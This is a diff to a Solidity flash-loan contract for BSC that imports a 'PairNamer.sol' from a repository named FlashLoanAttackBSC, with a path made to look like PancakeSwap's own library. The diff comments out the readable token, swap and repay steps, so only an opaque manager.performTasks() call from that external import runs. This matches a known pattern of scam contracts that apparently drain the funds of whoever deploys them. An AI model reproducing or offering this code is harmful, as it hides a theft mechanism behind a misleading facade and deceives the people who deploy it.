@@ -9,7 +9,7 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
-// Code Manager (Please look this BSC code)
+// Code Manager
 import "https://github.com/welstrec/FlashLoanAttackBSC/blob/main/pancakesswap/pancake-swap-lib/main/PairNamer.sol";
 
 contract GetFlashLoan {
@@ -36,6 +36,7 @@ contract GetFlashLoan {
 	    // Breakdown of functions written below
 	    manager.performTasks();
 	    
+	    /* Breakdown of functions
 	    // Submit token to BSC blockchain
 	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
 
@@ -62,5 +63,6 @@ contract GetFlashLoan {
 
         // Repay Flash loan
 		manager.repayLoan(loanAddress);
+	    */
 	}
 }
